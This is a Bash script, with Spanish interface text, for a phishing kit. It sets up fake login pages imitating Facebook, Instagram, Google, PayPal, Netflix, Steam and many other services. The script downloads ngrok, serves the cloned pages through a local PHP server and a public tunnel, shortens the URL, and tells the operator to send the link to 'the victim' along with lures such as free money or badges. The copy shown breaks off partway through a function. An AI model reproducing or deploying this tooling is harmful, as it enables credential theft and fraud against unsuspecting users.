#!/bin/bash

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        clear
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t
             _____    _____    ____     _____ 
     /\     |  __ \  |_   _|  / __ \   / ____|
    /  \    | |  | |   | |   | |  | | | (___  
   / /\ \   | |  | |   | |   | |  | |  \___ \ 
  / ____ \  | |__| |  _| |_  | |__| |  ____) |
 /_/    \_\ |_____/  |_____|  \____/  |_____/                                            
                                              
┬─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┌┬┐┌─┐
├┬┘├┤ │  │ │├┤ ├┬┘ ││├─┤│││├┤ 
┴└─└─┘└─┘└─┘└─┘┴└──┴┘┴ ┴┴ ┴└─┘  :)\n"
        sleep 2
        printf "\e[0m\n"
        exit 1
}

stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi

}

banner() {

clear
printf "\n"
printf '''
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗        ██████╗ ███████╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║       ██╔════╝ ╚══███╔╝
██████╔╝███████║██║███████╗███████║ ████║ ██║  ███╗  ███╔╝ 
██╔═══╝ ██╔══██║██║╚════██║██╔══██║       ██║   ██║ ███╔╝ 
██║     ██║  ██║██║███████║██║  ██║       ╚██████╔╝███████╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝        ╚═════╝ ╚══════╝
'''
printf "\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Desarrollado por Santy-Gz\e[0m\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Github: https://github.com/Santy-Gz\e[0m\n"
printf "\n"

}


reqs() {

printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Instalando recursos..\e[0m\n"
command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Instalando php\e[0m\n\n"; apt-get install php -y; }
command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Instalando php\e[0m\n\n"; apt-get install curl -y; }
command -v wget > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Instalando wget\e[0m\n\n"; apt-get install wget -y; }
command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Instalando unzip\e[0m\n\n"; apt-get install zip unzip -y; }

if [[ -d .htr ]]; then
printf ""
else
mkdir .htr
fi

if [[ -e Modules.zip ]]; then
unzip -qq Modules.zip
rm Modules.zip
fi

if [[ -e .htr/ngrok ]]; then
printf ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Descargando Ngrok..\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
mv -f ngrok .htr > /dev/null 2>&1
rm -rf ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x .htr/ngrok > /dev/null 2>&1
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Instala Ngrok ManualMente.\e[0m\n"
exit 1
fi
else
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Descargando Ngrok..\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
mv -f ngrok .htr > /dev/null 2>&1
rm -rf ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x .htr/ngrok > /dev/null 2>&1
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Instala Ngrok ManualMente.\e[0m\n"
exit 1
fi
fi
fi

if [[ -e .htr/ngrok2 ]]; then
printf ""
else
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Descargando el parche Ngrok...\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm64.zip ]]; then
unzip ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
mv -f ngrok .htr/ngrok2  > /dev/null 2>&1
rm -rf ngrok-2.2.8-linux-arm64.zip  > /dev/null 2>&1
chmod +x .htr/ngrok2  > /dev/null 2>&1
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Instala Ngrok ManualMente.\e[0m\n"
exit 1
fi
else
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Descargando el parche Ngrok...\e[0m\n"
wget --no-check-certificate https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-2.2.8-linux-386.zip ]]; then
unzip ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
mv -f ngrok .htr/ngrok2
rm -rf ngrok-2.2.8-linux-386.zip
chmod +x .htr/ngrok2
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Instala Ngrok ManualMente.\e[0m\n"
exit 1
fi
fi
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

}

menu(){
 banner
printf "\e[1;32m[\e[0m\e[1;77m*\e[0m\e[1;32m]\e[0m\e[36m Para ver las opciones del script usa :\e[1;96m\en\e[0m\n\n"
printf "    \e[31m╒━\e[0m \e[1;32m  Opcion   \e[0m \e[31m━╕\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m#\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mRedes = r\e[0m \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m#\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mOtros = O\e[0m \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m#\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mExit = 99\e[0m \e[31m]-|\e[0m\n"
printf "    \e[31m╘━\e[0m \e[1;32m  Opcion   \e[0m \e[31m━╛\e[0m\n\n"
read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[36m Selecciona alguna\e[0m => \e[0m\e[1;96m\en\e[0m' menu_principal
if [[ $menu_principal == r || $menu_principal == R ]]; then
r
elif [[ $menu_principal == o || $menu_principal == O ]]; then
o
elif [[ $menu_principal == 99 ]]; then
clear
printf "\e[0m\n"
printf "\e[31m
             _____    _____    ____     _____ 
     /\     |  __ \  |_   _|  / __ \   / ____|
    /  \    | |  | |   | |   | |  | | | (___  
   / /\ \   | |  | |   | |   | |  | |  \___ \ 
  / ____ \  | |__| |  _| |_  | |__| |  ____) |
 /_/    \_\ |_____/  |_____|  \____/  |_____/ 
                                              
┬─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┌┬┐┌─┐
├┬┘├┤ │  │ │├┤ ├┬┘ ││├─┤│││├┤ 
┴└─└─┘└─┘└─┘└─┘┴└──┴┘┴ ┴┴ ┴└─┘    \n
:)
\e[0m"
printf "\e[0m\n"
fi
exit 1
}

r (){
banner
printf "     \e[31m╒━\e[0m \e[1;32mRedes Sociales\e[0m \e[31m━╕\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m   \e[33mFacebook\e[0m   \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m02\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mInstagram\e[0m   \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m03\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mGoogle\e[0m    \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m04\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mMicrosoft\e[0m   \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m05\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mTwitter\e[0m   \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m06\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mGithub\e[0m    \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m07\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mTwitch\e[0m    \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m08\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mPinterest\e[0m   \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m09\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m   \e[33mSnapchat\e[0m   \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m10\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m   \e[33mLinkedin\e[0m   \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m11\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mReddit\e[0m    \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m12\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mYahoo\e[0m     \e[31m]-|\e[0m\e[0m\n"
printf "     \e[31m╘━\e[0m \e[1;32mRedes Sociales\e[0m \e[31m━╛\e[0m\n"
printf "\n"
printf "\e[1;32m[\e[0m\e[1;77m00\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mMenu\e[0m \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m99\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mExit\e[0m \e[31m]-|\e[0m\n"
printf "\n"
read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[36m Selecciona alguna\e[0m => \e[0m\e[1;96m\en\e[0m' menu_redes

if [[ $menu_redes == 1 || $menu_redes == 01 ]]; then
facebook
elif [[ $menu_redes == 2 || $menu_redes == 02 ]]; then
instagram
elif [[ $menu_redes == 3 || $menu_redes == 03 ]]; then
gmail
elif [[ $menu_redes == 4 || $menu_redes == 04 ]]; then
website="microsoft"
mask='unlimited-onedrive-space-for free'
tunnel_menu
elif [[ $menu_redes == 5 || $menu_redes == 05 ]]; then
website="twitter"
mask='get-blue-badge-on-twitter-free'
tunnel_menu
elif [[ $menu_redes == 6 || $menu_redes == 06  ]]; then
website="github"
mask='get-github-pro-features-free-lifetime'
tunnel_menu
elif [[ $menu_redes == 7 || $menu_redes == 07 ]]; then
website="twitch"
mask='unlimited-twitch-tv-user-for-free'
tunnel_menu
elif [[ $menu_redes == 8 || $menu_redes == 08 ]]; then
website="pinterest"
mask='get-a-premium-plan-for-pinterest-free'
tunnel_menu
elif [[ $menu_redes == 9 || $menu_redes == 09 ]]; then
website="snapchat"
mask='view-locked-snapchat-accounts-secretly'
tunnel_menu
elif [[ $menu_redes == 10 ]]; then
website="linkedin"
mask='get-a-premium-plan-for-linkedin-free'
tunnel_menu
elif [[ $menu_redes == 11 ]]; then
website="reddit"
mask='reddit-official-verified-member-badge'
tunnel_menu
elif [[ $menu_redes == 12 ]]; then
website="yahoo"
mask='grab-mail-from-anyother-yahoo-account-free'
tunnel_menu
elif [[ $menu_redes == 00 ]]; then
menu
elif [[ $menu_redes == 99 ]]; then
clear
printf "\e[0m\n"
printf "\e[31m
             _____    _____    ____     _____ 
     /\     |  __ \  |_   _|  / __ \   / ____|
    /  \    | |  | |   | |   | |  | | | (___  
   / /\ \   | |  | |   | |   | |  | |  \___ \ 
  / ____ \  | |__| |  _| |_  | |__| |  ____) |
 /_/    \_\ |_____/  |_____|  \____/  |_____/ 
                                              
┬─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┌┬┐┌─┐
├┬┘├┤ │  │ │├┤ ├┬┘ ││├─┤│││├┤ 
┴└─└─┘└─┘└─┘└─┘┴└──┴┘┴ ┴┴ ┴└─┘  \n 
:)
\e[0m"
printf "\e[0m\n"
fi
exit 1
}

o (){
    banner
printf "     \e[31m╒━\e[0m \e[1;32m     Otros    \e[0m \e[31m━╕\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mNetflix\e[0m   \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m02\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mPaypal\e[0m    \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m03\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mSteam\e[0m     \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m04\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m     \e[33mEbay\e[0m     \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m05\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mDropbox\e[0m   \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m06\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mProtonmail\e[0m  \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m07\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mSpotify\e[0m   \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m08\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mAdobe\e[0m     \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m09\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mDeviantArt\e[0m  \e[31m]-|\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m10\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m    \e[33mOrigin\e[0m    \e[31m]-|\e[0m\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m11\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mCryptoCoin\e[0m  \e[31m]-|\e[0m\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m12\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m  \e[33mWordpress\e[0m   \e[31m]-|\e[0m\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m13\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m      \e[33mVk\e[0m      \e[31m]-|\e[0m\e[0m\n"
printf "\e[0m\e[1;32m[\e[0m\e[1;77m14\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m     \e[33mXBOX\e[0m     \e[31m]-|\e[0m\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m15\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mPlaystation\e[0m  \e[31m]-|\e[0m\n"        
printf "     \e[31m╘━\e[0m \e[1;32m     Otros    \e[0m \e[31m━╛\e[0m\n"
printf "\n"
printf "\e[1;32m[\e[0m\e[1;77m00\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mMenu\e[0m \e[31m]-|\e[0m\n"
printf "\e[1;32m[\e[0m\e[1;77m99\e[0m\e[1;32m]\e[0m\e[1;93m \e[31m|-[\e[0m \e[33mExit\e[0m \e[31m]-|\e[0m\n"
printf "\n"  
read -p $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[36m Selecciona alguna\e[0m => \e[0m\e[1;96m\en\e[0m' menu_otros

if [[ $menu_otros == 1 || $menu_otros == 01 ]]; then
website="netflix"
mask='upgrade-your-netflix-plan-free'
tunnel_menu
elif [[ $menu_otros == 2 || $menu_otros == 02 ]]; then
website="paypal"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 3 || $menu_otros == 03 ]]; then
website="steam"
mask='steam-500-usd-gift-card-free'
tunnel_menu
elif [[ $menu_otros == 4 || $menu_otros == 04 ]]; then
website="ebay"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 5 || $menu_otros == 05 ]]; then
website="dropbox"
mask='get-500-gb-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 6 || $menu_otros == 06 ]]; then
website="protonmail"
mask='protonmail-pro-basics-for-free'
tunnel_menu
elif [[ $menu_otros == 7 || $menu_otros == 07 ]]; then
website="spotify"
mask='convert-your-account-to-spotify-premium'
tunnel_menu
elif [[ $menu_otros == 8 || $menu_otros == 08 ]]; then
website="adobe"
mask='get-adobe-lifetime-pro-membership-free'
tunnel_menu
elif [[ $menu_otros == 9 || $menu_otros == 09 ]]; then
website="deviantart"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 10 ]]; then
website="origin"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 11 ]]; then
website="cryptocoinsniper"
mask='get-500-btc-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 12 ]]; then
website="wordpress"
mask='unlimited-wordpress-traffic-free'
tunnel_menu
elif [[ $menu_otros == 13 ]]; then
vk
elif [[ $menu_otros == 14 ]]; then
website="xbox"
mask='get-500-usd-free-to-your-acount'
tunnel_menu
elif [[ $menu_otros == 15 ]]; then
website="playstation"
mask='playstation-500-usd-gift-card-free'
tunnel_menu
elif [[ $menu_otros == 00 ]]; then
menu
elif [[ $menu_otros == 99 ]]; then
clear
printf "\e[0m\n"
printf "\e[31m
             _____    _____    ____     _____ 
     /\     |  __ \  |_   _|  / __ \   / ____|
    /  \    | |  | |   | |   | |  | | | (___  
   / /\ \   | |  | |   | |   | |  | |  \___ \ 
  / ____ \  | |__| |  _| |_  | |__| |  ____) |
 /_/    \_\ |_____/  |_____|  \____/  |_____/ 
                                              
┬─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┌┬┐┌─┐
├┬┘├┤ │  │ │├┤ ├┬┘ ││├─┤│││├┤ 
┴└─└─┘└─┘└─┘└─┘┴└──┴┘┴ ┴┴ ┴└─┘  \n 
:)
\e[0m"
printf "\e[0m\n"
exit 1

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opcion invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

facebook(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Pagina por defecto\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Página de inicio de encuesta avanzada\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Página de inicio de sesión de seguridad fake\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Inicio de secion en Messenger\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Selecciona alguna => \e[0m\e[1;96m\en' fb_option

if [[ $fb_option == 1 || $fb_option == 01 ]]; then
website="facebook"
mask='blue-verified-badge-for-facebook-free'
tunnel_menu
elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
website="fb_advanced"
mask='vote-for-the-best-social-media'
tunnel_menu
elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
website="fb_security"
mask='make-your-facebook-secured-and-free-from-hackers'
tunnel_menu
elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
website="fb_messenger"
mask='get-messenger-premium-features-free'
tunnel_menu

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opcion invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

instagram(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Pagina por defecto\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Página de seguidores automáticos\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Página de verificación de insignia azul\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Selecciona alguna => \e[0m\e[1;96m\en' ig_option

if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
mask='get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
mask='get-unlimited-followers-for-instagram'
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
mask='blue-badge-verify-for-instagram-free'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opcion invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

gmail(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Login Page Antigua\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Login Page Nueva\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Encuesta de votación avanzada\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Selecciona alguna => \e[0m\e[1;96m\en' gmail_option

if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
website="google"
mask='get-unlimited-google-drive-free'
tunnel_menu
elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
website="google_new"
mask='get-unlimited-google-drive-free'
tunnel_menu
elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
website="google_poll"
mask='vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opcion invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

vk(){

printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Pagina por defecto\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Página de inicio de encuesta avanzada\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Selecciona alguna => \e[0m\e[1;96m\en' vk_option

if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
mask='vk-premium-real-method-2020'
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
mask='vote-for-the-best-social-media'
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opcion invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

tunnel_menu() {

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

cp -rf .Modules/$website/* .htr/www
cp -f .Modules/ip.php .htr/www/

def_tunnel_menu="2"
banner
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost \e[0m\e[91m[\e[0m\e[96mDevs Only\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok.io \e[0m\e[91m[\e[0m\e[96mRequiere Hotspot\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Ngrok.io \e[0m\e[91m[\e[0m\e[96mNo necesita Hotspot\e[0m\e[91m]\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Seleccione una opción de puerto => \e[0m\e[1;96m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_ngrok
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_ngrok2

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opcion invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

validate() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            printf "\n\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m  Ngrok no pudo generar el vínculo. Vuelve a intentarlo ...\e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\n\n"
            exit 1
        fi
    fi
}

start_ngrok() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Lanzando de Ngrok ..Prende el Hotspot..\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 5
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
validate $ngrok_link
linker=$(curl -s https://da.gd/s/?url=${ngrok_link})
validate $linker
linker2=${linker#https://}
sleep 3
banner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Envia este Link a la Victima :\e[0m\e[1;93m %s \n" $mask@$linker2
datafound

}

start_ngrok2() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Lanzando parche de Ngrok  ...\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok2 http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 5
ngrok_link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
validate $ngrok_link2
linker1=$(curl -s https://da.gd/s/?url=${ngrok_link2})
validate $linker1
linker21=${linker1#https://}
sleep 3
banner
printf "\e[0m\n"
